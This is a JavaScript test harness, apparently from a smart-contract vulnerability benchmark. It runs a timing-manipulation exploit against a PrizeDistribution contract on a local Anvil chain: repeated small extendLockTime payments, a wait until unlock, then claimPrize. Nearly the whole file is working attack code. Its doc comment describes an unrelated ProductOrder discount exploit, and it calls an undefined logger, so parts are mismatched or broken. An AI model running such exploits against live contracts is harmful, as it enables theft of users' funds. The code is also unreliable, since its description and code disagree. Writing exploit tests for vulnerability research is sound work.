require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');

const { setTimeout } = require('timers');
const { sleep } = require('@lib/os/process');
const { createLoggerWeb3 } = require('@lib/web3/deploy');

// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
const contractFileFullName = 'PrizeDistribution.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'regular', contractFileFullName), 'utf8');
let solcVersion = extractSolcVersion(source);

let BONUS_THRESHOLD = 10;

/**
 * Attempts to exploit a vulnerability in the ProductOrder smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */
async function exploit(web3, envInfo, contractAddress) {
   try {
       let { abi } = await compileWithVersion(source, contractFileFullName, 'PrizeDistribution', solcVersion);
       let contractInstance = await new web3.eth.Contract(abi, contractAddress);
       let organizerAccount = envInfo.accounts[0];
       let beneficiaryAccount = envInfo.accounts[1];

       console.log("Starting cumulative timing manipulation...");

       // Step 1: Incrementally extend the lock time with minimal amounts to avoid significant extensions
       for (let i = 0; i < 10; i++) {
           let extendTx = await contractInstance.methods.extendLockTime().send({
               from: organizerAccount,
               value: 1, // Sending the minimal amount (1 wei)
               gas: 300000
           });

           console.log(`Minimal increment ${i+1} sent, tx status: ${extendTx.status}`);
           await sleep(200); // Short delay between calls to create slight time differences
       }

       // Step 2: Send a significant amount just below the threshold, multiple times
       for (let i = 0; i < 5; i++) {
           let extendTx = await contractInstance.methods.extendLockTime().send({
               from: organizerAccount,
               value: BONUS_THRESHOLD - 1, // Sending just below the threshold to avoid bonus period
               gas: 300000
           });

           console.log(`Significant increment ${i+1} sent, tx status: ${extendTx.status}`);
           await sleep(300); // Short delay between calls to create slight time differences
       }

       // Step 3: Send a large amount to extend the lock time significantly and increase the prize
       let largeExtendTx = await contractInstance.methods.extendLockTime().send({
           from: organizerAccount,
           value: BONUS_THRESHOLD * 3, // Sending a large amount to trigger significant lock time extension
           gas: 300000
       });

       console.log(`Large increment sent, tx status: ${largeExtendTx.status}`);
       await sleep(500);

       let unlockTime = await contractInstance.methods.unlockTime().call();
       console.log("Final unlock time:", unlockTime);
       await sleep(500);

       let currentTime = Math.floor(Date.now() / 1000);
       console.log("Current system time:", currentTime);

       // Step 4: Wait until just after the unlock time to try claiming the prize
       if (currentTime < unlockTime) {
           let waitTime = unlockTime - currentTime + 1; // Wait just past unlock time
           console.log(`Waiting for ${waitTime} seconds until unlock time...`);
           await new Promise(resolve => setTimeout(resolve, waitTime * 1000));
           await sleep(500);
       }

       // Attempt to claim the prize
       let claimTx = await contractInstance.methods.claimPrize().send({
           from: beneficiaryAccount,
           gas: 300000
       });
       await sleep(500);

       if (claimTx.status) {
           console.log("Prize successfully claimed!");
           return true; // Exploit successful
       } else {
           console.error("Failed to claim the prize!");
           return false; // Exploit failed
       }
   } catch (error) {
       console.error(error.stack);
       return false;
   }
}






/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    
    web3 = await createLoggerWeb3(web3);
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    logger.info(chalk.green("Exploit successful!"));

    return result; 
}
